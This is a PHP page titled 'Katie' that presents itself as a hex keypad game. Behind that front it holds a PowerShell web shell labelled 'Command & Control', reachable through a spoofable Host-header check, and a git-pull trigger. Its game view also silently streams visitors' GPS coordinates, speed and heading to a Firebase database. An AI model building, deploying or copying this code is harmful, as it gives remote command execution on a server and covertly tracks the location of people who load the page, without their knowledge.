<?php
// --- 1. HOST HEADER ROUTING ---
$host = $_SERVER['HTTP_HOST'];
$host_no_port = preg_replace('/:\d+$/', '', $host);
$is_admin = filter_var($host_no_port, FILTER_VALIDATE_IP) || $host_no_port === 'localhost';

if (isset($_POST['ps_cmd']) && $is_admin) {
    $cmd = $_POST['ps_cmd'];
    $output = shell_exec('powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "' . addslashes($cmd) . '" 2>&1');
    echo htmlspecialchars($output ?: "Command executed (Windows VPS target required).");
    exit;
}

if (isset($_GET['git_sync']) && $_GET['git_sync'] === 'katie') {
    if (file_exists(__DIR__ . '/.locker')) {
        echo "<main style='background:#121212;color:red;padding:20px;' role='alert'><h3>[!] SYNC LOCKED</h3></main>";
        exit;
    }
    echo "<main style='background:#121212;color:#39ff14;padding:20px;' role='status'><pre>";
    echo shell_exec('git config --global --add safe.directory "*" 2>&1');
    echo shell_exec('git pull origin main 2>&1');
    echo "</pre></main>";
    exit;
}

$output = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['key_data'])) {
    $output = htmlspecialchars($_POST['key_data']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Katie</title>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<style>
    :root { --bg-color: #0d0d0d; --panel-bg: #1a1a1a; --neon-green: #39ff14; --text-color: #ffffff; --focus-outline: #ffffff; }
    body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Consolas', Courier, monospace; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
    *:focus-visible { outline: 3px solid var(--focus-outline); outline-offset: 2px; }
    .game-container { max-width: 380px; width: 100%; background: var(--panel-bg); padding: 25px; border-radius: 12px; border: 1px solid #333; margin-top: 50px; position: relative; }
    .display { width: 100%; height: 70px; background: #000; border: 2px solid #333; color: var(--neon-green); font-size: 32px; text-align: right; padding: 10px; margin-bottom: 25px; box-sizing: border-box; font-family: inherit; }
    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); grid-auto-rows: 70px; gap: 15px; }
    .key { background: #2d2d2d; border: 1px solid #444; border-radius: 8px; font-size: 28px; display: flex; justify-content: center; align-items: center; cursor: pointer; user-select: none; box-shadow: 0 4px 0 #111; color: white;}
    .key:active { background: #4a4a4a; transform: translateY(4px); box-shadow: 0 0 0 #111;}
    .key-go { grid-column: 3; grid-row: 3 / span 2; background: var(--neon-green); color: black; font-weight: 900; border: none; font-size: 32px; box-shadow: 0 4px 0 #20990b; cursor: pointer; }
    .key-go:active { background: #2cc910; box-shadow: 0 0 0 #20990b; }
    .key-lr { grid-column: 1 / span 2; font-size: 20px; font-weight: bold; }
    #avatar-container { width: 100px; height: 100px; background: #000; border: 2px solid var(--neon-green); border-radius: 50%; position: absolute; top: -50px; left: calc(50% - 50px); display: flex; flex-direction: column; justify-content: center; align-items: center; font-size: 10px; color: var(--neon-green); box-shadow: 0 0 15px rgba(57,255,20,0.3); }
    #gps-status { font-weight: bold; margin-top: 5px;}
    .admin-container { max-width: 800px; width: 100%; background: #000; border: 1px solid #444; padding: 10px; border-radius: 5px; margin-bottom: 20px;}
    #ps_output { width: 100%; height: 250px; background: #000; color: #00ffcc; border: none; overflow-y: auto; font-size: 14px; white-space: pre-wrap; margin-bottom: 10px; }
    .ps-input-row { display: flex; }
    .ps-prompt { color: #ffeb3b; padding-right: 10px; line-height: 30px; }
    #ps_command { flex-grow: 1; background: transparent; color: var(--neon-green); border: none; font-size: 16px; font-family: inherit; outline: none; }
</style>
</head>
<body>

<?php if ($is_admin): ?>
    <header><h2 style="color:var(--neon-green);">Katie | Command & Control</h2></header>
    <main role="main">
        <div class="admin-container" onclick="document.getElementById('ps_command').focus()">
            <div id="ps_output" role="log" aria-live="polite">Katie PowerShell Session connected.&#13;&#10;</div>
            <div class="ps-input-row">
                <span class="ps-prompt" aria-hidden="true">PS C:\></span>
                <input type="text" id="ps_command" aria-label="PowerShell Command Input" autocomplete="off" onkeydown="if(event.keyCode===13) executePS()">
            </div>
        </div>
    </main>
    <script>
        function executePS() {
            const input = document.getElementById('ps_command');
            const output = document.getElementById('ps_output');
            const cmd = input.value;
            if (!cmd) return;
            output.innerHTML += `<span style="color:#ffeb3b;">PS C:\\> ${cmd}</span>\n`;
            input.value = '';
            const formData = new FormData();
            formData.append('ps_cmd', cmd);
            fetch('', { method: 'POST', body: formData }).then(res => res.text()).then(text => { output.innerHTML += text + '\n'; output.scrollTop = output.scrollHeight; });
        }
    </script>
<?php else: ?>
    <main class="game-container" role="application" aria-label="Katie Interactive Keypad">
        <div id="avatar-container" role="status" aria-live="polite">
            <span aria-hidden="true">📡 TELEMETRY</span>
            <span id="gps-status" aria-label="Current Movement Status">Locating...</span>
        </div>
        <form method="POST">
            <input type="text" id="key_data" name="key_data" class="display" value="<?= $output ?>" readonly aria-label="Current Hex Input">
            <div class="keypad" role="group" aria-label="Hex Input Keys">
                <button type="button" class="key" onclick="press('1')" aria-label="1">1</button>
                <button type="button" class="key" onclick="press('2')" aria-label="2">2</button>
                <button type="button" class="key" onclick="press('3')" aria-label="3">3</button>
                <button type="button" class="key" onclick="press('4')" aria-label="4">4</button>
                <button type="button" class="key" onclick="press('5')" aria-label="5">5</button>
                <button type="button" class="key" onclick="press('6')" aria-label="6">6</button>
                <button type="button" class="key" onclick="press('7')" aria-label="7">7</button>
                <button type="button" class="key" onclick="press('8')" aria-label="8">8</button>
                <button type="submit" class="key key-go" aria-label="Execute Command">GO</button>
                <button type="button" class="key" onclick="press('9')" aria-label="9">9</button>
                <button type="button" class="key" onclick="press('0')" aria-label="0">0</button>
                <button type="button" class="key key-lr" onclick="press('L/R')" aria-label="Left or Right">L / R</button>
            </div>
        </form>
    </main>
    <script>
        function press(val) { document.getElementById('key_data').value += val === 'L/R' ? '[LR]' : val; }
        const firebaseConfig = { projectId: "studio-6892711111-9062f", databaseURL: "https://studio-6892711111-9062f-default-rtdb.firebaseio.com/" };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const db = firebase.database();
        const playerId = "player_" + Math.floor(Math.random() * 10000); 
        if ('geolocation' in navigator) {
            navigator.geolocation.watchPosition((position) => {
                const speedRaw = position.coords.speed; 
                const speed = speedRaw !== null ? speedRaw : 0; 
                const mode = speed > 4.5 ? 'DRIVING' : 'WALKING'; 
                document.getElementById('gps-status').innerText = mode;
                db.ref('telemetry/' + playerId).set({ lat: position.coords.latitude, lon: position.coords.longitude, heading: position.coords.heading || 0, speed: speed, state: mode, timestamp: firebase.database.ServerValue.TIMESTAMP });
            }, (err) => { document.getElementById('gps-status').innerText = 'GPS OFF'; }, { enableHighAccuracy: true });
        }
    </script>
<?php endif; ?>
</body>
</html>
